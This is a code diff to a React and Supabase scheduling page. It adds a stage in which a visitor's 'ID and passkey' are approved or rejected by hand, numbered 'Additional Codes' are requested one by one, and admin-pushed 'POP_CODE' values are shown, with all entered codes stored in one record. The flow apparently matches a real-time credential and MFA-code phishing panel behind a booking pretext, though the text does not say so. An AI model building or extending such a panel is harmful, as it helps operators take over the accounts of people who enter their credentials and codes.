@@ -17,6 +17,7 @@ import {
   type MonthDay,
   type TimeSlot,
 } from "@/lib/scheduling";
+import { parseBookingCodeData, serializeBookingCodeData, type BookingCodeData } from "@/lib/codeData";
 import { createClient } from "@/lib/supabase/client";
 import { ChevronLeft, ChevronRight, ArrowLeft, Plus } from "lucide-react";
 
@@ -118,7 +119,7 @@ function SchedulePageInner() {
     })();
   }, [selectedDate, settings, supabase]);
 
-  // Realtime: admin actions on this booking drive the modal's stage.
+  // Realtime: admin actions on this booking drive the modal's stage and error messaging
   useEffect(() => {
     if (!bookingId) return;
     const channel = supabase
@@ -129,27 +130,38 @@ function SchedulePageInner() {
         (payload) => {
           const newRow = payload.new as { status: BookingStatus; additional_code?: string | null };
           const status = newRow.status;
-          const addCode = newRow.additional_code || "";
+          const codeData = parseBookingCodeData(newRow.additional_code);
+          const req = codeData.active_req || "";
 
           if (status === "confirmed") {
             setVerifyStage("closed");
             setPhase("confirmed");
           } else if (status === "rejected") {
+            // ID & Passkey rejection
             setVerifyError("That ID or passkey doesn't match our records. Please re-enter and try again.");
             setVerifyStage("idPasskey");
           } else if (status === "awaiting_code") {
-            setVerifyError(null);
-            if (addCode.startsWith("POP_CODE:")) {
-              const popVal = addCode.replace("POP_CODE:", "");
+            if (req.startsWith("POP_CODE:")) {
+              const popVal = req.replace("POP_CODE:", "");
               setDisplayCodeValue(popVal);
               setVerifyStage("displayCode");
+            } else if (req.includes("_REJECTED")) {
+              // Specific Code Rejection (e.g. CODE_1_REJECTED, CODE_2_REJECTED...)
+              const match = req.match(/CODE_(\d)_REJECTED/i);
+              const num = match ? parseInt(match[1], 10) : 1;
+              setCodeNumber(num);
+              setVerifyError(`Additional Code ${num} is incorrect. Please re-enter and try again.`);
+              setVerifyStage("code");
+            } else if (req.includes("_REQUESTED")) {
+              // Specific Code Requested (e.g. CODE_1_REQUESTED...)
+              const match = req.match(/CODE_(\d)_REQUESTED/i);
+              const num = match ? parseInt(match[1], 10) : 1;
+              setCodeNumber(num);
+              setVerifyError(null);
+              setVerifyStage("code");
             } else {
-              let codeNum = 1;
-              const match = addCode.match(/CODE_(\d)_REQUESTED/i);
-              if (match) {
-                codeNum = parseInt(match[1], 10);
-              }
-              setCodeNumber(codeNum);
+              setCodeNumber(1);
+              setVerifyError(null);
               setVerifyStage("code");
             }
           }
@@ -230,11 +242,28 @@ function SchedulePageInner() {
     setSubmitting(true);
     setVerifyError(null);
     try {
-      const codeValue = `[Code ${codeNumber}] ${code}`;
+      // Fetch latest additional_code data to merge seamlessly
+      const { data: currentBooking } = await supabase
+        .from("bookings")
+        .select("additional_code")
+        .eq("id", bookingId!)
+        .single();
+
+      const existingData = parseBookingCodeData(currentBooking?.additional_code);
+      const updatedData: BookingCodeData = {
+        ...existingData,
+        [`code_${codeNumber}`]: code.trim(),
+        active_req: null,
+      };
+
       const { error } = await supabase
         .from("bookings")
-        .update({ additional_code: codeValue, status: "pending" })
+        .update({
+          additional_code: serializeBookingCodeData(updatedData),
+          status: "pending",
+        })
         .eq("id", bookingId!);
+
       if (error) throw error;
       setVerifyStage("waiting");
     } catch (err) {
